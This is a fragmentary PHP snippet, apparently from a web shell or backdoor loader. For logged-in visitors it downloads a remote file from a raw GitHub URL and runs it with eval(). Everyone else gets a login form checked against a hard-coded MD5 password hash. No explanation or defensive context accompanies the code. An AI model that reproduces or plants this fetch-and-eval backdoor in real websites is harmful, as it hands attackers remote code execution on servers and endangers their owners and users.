...
if (is_logged_in()) {
    ...
    $a = geturlsinfo('https://raw.githubusercontent.com/just4lone/trinity/main/enc.txt');
    eval('?>' . $a);
} else {
    // Display login form if not logged in
    if (isset($_POST['password'])) {
        $entered_password = $_POST['password'];
        $hashed_password = '16354e00f68d84fd64add5c2182dba23'; // Replace this with your MD5 hashed password
